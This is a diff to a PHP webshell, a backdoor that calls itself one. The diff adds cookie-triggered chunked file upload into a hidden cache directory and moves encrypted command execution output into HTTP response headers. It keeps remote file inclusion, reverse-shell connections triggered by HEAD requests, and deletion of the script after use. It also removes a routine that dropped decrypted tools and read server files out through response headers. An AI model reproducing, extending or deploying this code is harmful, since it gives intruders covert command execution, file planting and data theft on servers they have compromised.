@@ -1,11 +1,11 @@
 <?php
-//leave me in.
+//d16d24366c1074f0607ae6c5bdb3ab9e21813ccc0b91edb4a15a680a1ee5ee08fed6fce744e13f3209a70c8dbe6e285b035de9cb7d7277e08765043cf63c7b28ff0d17e73bad5fa53aa6d2
 
 error_reporting(E_WARNING | E_PARSE);
-define("allow_agent", sha1(""));
-define("uuid", sha1(""));
-define("cname", "");
-define("cval", sha1(""));
+define("allow_agent", sha1("sp/1.1"));
+define("uuid", sha1("123-123-123-123-123"));
+define("cname", "test");
+define("cval", sha1("test"));
 if (!defined('allowed_chars')) {
     define("allowed_chars", "abcdefghijklmnopqrstuvwxyzABCDEFGHIJLKMNOPQRSTUVWXYZ");
 }
@@ -34,22 +34,41 @@ if (!defined("dirSeparator")) {
 if (slopos === "Windows") {
     if (!is_dir(".\\scache")) {
         if (is_writable(getcwd())) {
-            mkdir(".\\scache");
+            if (!is_dir(sprintf("%s\\scache", getcwd()))) {
+                mkdir(".\\scache");
+            }
+            if (!strpos(shell_exec(sprintf("attrib %s\\scache", getcwd())), "H") === false) {
+                shell_exec("attrib +H .\\scache");
+            }
         } else {
-            mkdir(sprintf("%s\\scache", sys_get_temp_dir()));
+            if (!is_dir(sprintf("%s\\scache", sys_get_temp_dir()))){
+                mkdir(sprintf("%s\\scache", sys_get_temp_dir()));
+            }
+            if (!strpos(shell_exec(sprintf("attrib %s\\scache", sys_get_temp_dir())), "H") === false){
+                shell_exec(sprintf("attrib +H %s\\scache", sys_get_temp_dir()));
+            }
         }
-        shell_exec("attrib +H .\\scache");
+        if (is_dir(sprintf("%s\\scache", getcwd()))){
+            define("scache", sprintf("%s\\scache", getcwd()));
+        }else{
+            define("scache", sprintf("%s\\scache", sys_get_temp_dir()));
+        }
     }
-    define("scache", getcwd() . "\\scache");
 } else {
     if (!is_dir("./.scache")) {
         if (is_writable(getcwd())) {
             mkdir("./.scache");
-        } else {
+            shell_exec(sprintf("chmod u=rwx,g=,o= %s/.scache", getcwd()));
+        } else{
             mkdir(sprintf("%s/.scache", sys_get_temp_dir()));
+            shell_exec(sprintf("chmod u=rwx,g=,o= %s/.scache", sys_get_temp_dir()));
         }
     }
-    define("scache", getcwd() . "/.scache");
+    if (is_dir(sprintf("%s/.scache", sys_get_temp_dir()))){
+        define("scache", sprintf("%s/.scache", sys_get_temp_dir()));
+    }else{
+        define("scache", sprintf("%s/.scache", getcwd()));
+    }
 }
 
 if (function_exists("gnupg_decrypt") && function_exists("gnupg_key_import") && function_exists("escapeshellarg")) {
@@ -127,29 +146,17 @@ function banner()
 }
 
 
-function b64($data, $switch)
-{
-    if ($switch === "u") {
-        if (!empty($data) && is_array($data)) {
-            if (!is_null($data['read'])) {
-                echo "\nMake sure you have found a writable directory, otherwise this will not go through\n";
-                $a = "./" . substr(str_shuffle(allowed_chars), 0, rand(3, 5));
-                fputs(fopen($a, "x+"),
-                    openssl_decrypt($data['Base64_Encoded_Tool'], $data['Cipher'], $data['Key'],
-                        OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING, $data['IV'], $data['Tag'], $data['aad']));
-                echo "File saved at: {$a}\nYou may want to move this file out of the current web directory, 
-                so you can hide it. But this will do for now.\n";
-                return true;
-            }
-        }
-    } else {
-        if (is_file($data['read'])) {
-            header("FileName: " . $data['read']);
-            header("File_data: " . base64_encode(file_get_contents($data['read'])));
-            return true;
-        }
+// removing b64, replacing with chunked file transfer.
+function chunkFileTransfer(string $fname, string $count, string $data){
+    if (defined("slopWindows")) {
+        $fp = fopen(sprintf("%s\\%s", scache, $fname), "a+");
+    }else{
+        $fp = fopen(sprintf("%s/%s", scache, $fname), "a+");
     }
-    return false;
+    $chunk = base64_decode($data);
+    fwrite($fp, $chunk, strlen($chunk));
+    fclose($fp);
+    return $count;
 }
 
 function checkComs(): array
@@ -302,7 +309,7 @@ function normalize_for_windows($com): string
 
 function executeCommands($command)
 {
-    if (str_contains(strtolower(slopos), "windows") !== false) {
+    if (defined("slopWindows")) {
         $command = normalize_for_windows($command);
     }
     # Try to find a way to run our command using various PHP internals
@@ -343,7 +350,21 @@ function slopp()
         header("I-Am-Alive: Yes");
         banner();
         switch (true) {
+            case (isset($_COOKIE['cft'])):
+                $putdata = fopen("php://input", "r");
+                $cft = explode(".", base64_decode($_COOKIE['cftd']));
+                while ($data = fread($putdata, 1024)){
+                    chunkFileTransfer($cft[0], $cft[1], $data);
+                }
+                if (defined("slopWindows")){
+                    header(sprintf("MD5: %s", md5_file(sprintf("%s\\%s", scache, $cft[0]))));
+                }else{
+                    header(sprintf("MD5: %s", md5_file(sprintf("%s/%s", scache, $cft[0]))));
+                }
+                fclose($putdata);
+                break;
             case (isset($_COOKIE['qs'])):
+                $qs = [];
                 foreach (checkComs() as $commands => $isenabled) {
                     $isenabled = trim($isenabled);
                     if ($isenabled === "Disabled") {
@@ -351,7 +372,7 @@ function slopp()
                     } else {
                         $r = "\033[0;36m{$isenabled}\033[0m";
                     }
-                    echo sprintf("\033[0;35m[ %s ]\033[0m => %s\n", $commands, trim($r));
+                    $qs['commands'] .= sprintf("\033[0;35m[ %s ]\033[0m => %s\n", $commands, trim($r));
                 }
                 foreach (checkShells(slopos) as $shells => $isenabled) {
                     $isenabled = trim($isenabled);
@@ -360,7 +381,7 @@ function slopp()
                     } else {
                         $r = "\033[0;36m{$isenabled}\033[0m";
                     }
-                    echo sprintf("\033[0;35m[ %s ]\033[0m => %s\n", $shells, trim($r));
+                    $qs['shells'] .= sprintf("\033[0;35m[ %s ]\033[0m => %s\n", $shells, trim($r));
                 }
                 foreach (parseProtections() as $prots => $isenabled) {
                     $isenabled = trim($isenabled);
@@ -369,7 +390,7 @@ function slopp()
                     } else {
                         $r = "\033[0;36m{$isenabled}\033[0m";
                     }
-                    echo sprintf("\033[0;35m[ %s ]\033[0m => %s\n", $prots, trim($r));
+                    $qs['prots'] .= sprintf("\033[0;35m[ %s ]\033[0m => %s\n", $prots, trim($r));
                 }
                 foreach (checkPack() as $packs => $isenabled) {
                     $isenabled = trim($isenabled);
@@ -378,7 +399,7 @@ function slopp()
                     } else {
                         $r = "\033[0;36m{$isenabled}\033[0m";
                     }
-                    echo sprintf("\033[0;35m[ %s ]\033[0m => %s\n", $packs, trim($r));
+                    $qs['packManagers'] .= sprintf("\033[0;35m[ %s ]\033[0m => %s\n", $packs, trim($r));
                 }
                 $fsize = ini_get("max_file_uploads") ? "\033[0;32m" . ini_get("max_file_uploads") . "\033[0m" : "\033[0;31mcannot set max_file_uploads\033[0m";
                 $sfem = ini_get("safe_mode") ? "\033[0;32mset to true\033[0m" : "\033[0;31mcannot set safemode.\033[0m";
@@ -394,7 +415,7 @@ function slopp()
                     sprintf("slopPGP: %s", slopPGP ? "\033[0;32mtrue\033[0m" : "\033[0;31mfalse\033[0m"),
                     sprintf(".scache full path: %s", scache)
                 ]);
-                echo <<<INI
+                $qs['configs'] = <<<INI
 Max file uploads: $fsize
 Safemode: $sfem
 File_Uploads: $fups
@@ -404,6 +425,7 @@ Include Path: $incp
 ---------------- SLOP DEFINES ---------------------
 $slopDefines
 INI. PHP_EOL;
+                header(sprintf("D: %s", base64_encode(implode("\n", $qs))));
                 break;
             case (isset($_COOKIE["cr"])):
                 if ($_COOKIE['cr'] === "1") {
@@ -418,30 +440,17 @@ INI. PHP_EOL;
                     if (defined("slopEncryption") && slopEncryption) {
                         try {
                             $split = sodium_crypto_aead_chacha20poly1305_decrypt(base64_decode($v[3]), base64_decode($v[2]), base64_decode($v[0]), base64_decode($v[1]));
+                            header(sprintf("D: %s", base64_encode(executeCommands($split))));
                         } catch (SodiumException $e) {
-                            echo "Failed to decrypt: {$e->getMessage()}" . PHP_EOL;
+                            header(sprintf("D: %s", $e->getMessage()));
                         }
-                        header(sprintf("D: %s", base64_encode(executeCommands($split))));
                     } else {
-                        header("D: Damnit jim, im a doctor, not a magician.");
+                        header("D: Damnit jim, im a webshell, not a magician. I NEED SODIUM!");
                     }
                 }
                 break;
             case (isset($_COOKIE["doInclude"])):
                 remoteFileInclude($_COOKIE["doInclude"]);
-                break;
-            case (isset($_COOKIE["cb64"])):
-                $aSX = explode(".", $_COOKIE['cb64']);
-                if (hash("sha512", $_COOKIE['jsessionid'], $binary = false) === $aSX[1]) {
-                    $sp = explode('.', base64_decode($_COOKIE['jsessionid']));
-                    try {
-                        $final = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt($sp[3], $sp[0], $sp[1], $sp[2]);
-                    } catch (SodiumException $e) {
-                        throw new Exception("I require Sodium!");
-                    }
-                    $axD = unserialize(base64_decode($final), ['allowed_classes' => false]);
-                    b64($axD, $aSX[0]);
-                }
                 break;
             case ($_SERVER['REQUEST_METHOD'] === "HEAD" && isset($_COOKIE['jsessionid'])):
                 $splitter = explode(".", base64_decode($_COOKIE['jsessionid']));
@@ -454,7 +463,6 @@ INI. PHP_EOL;
                         reverseConnections($splitter[0], $splitter[3], $splitter[1], $splitter[2]);
                     }
                 } else {
-                    echo "Cannot fork, as it does not exist on this system..... using passthru\n";
                     $re = null;
                     passthru(reverseConnections($splitter[0], $splitter[3], $splitter[1], $splitter[2]), $re);
                 }
@@ -462,10 +470,10 @@ INI. PHP_EOL;
             default:
                 break;
         }
-            foreach (uwumodifyme() as $new_data => $d) {
-                header("{$new_data}: {$d}");
-            }
-            unlink($_SERVER['SCRIPT_FILENAME']);
+        foreach (uwumodifyme() as $new_data => $d) {
+            header("{$new_data}: {$d}");
+        }
+        unlink($_SERVER['SCRIPT_FILENAME']);
         die();
     } else {
         die();
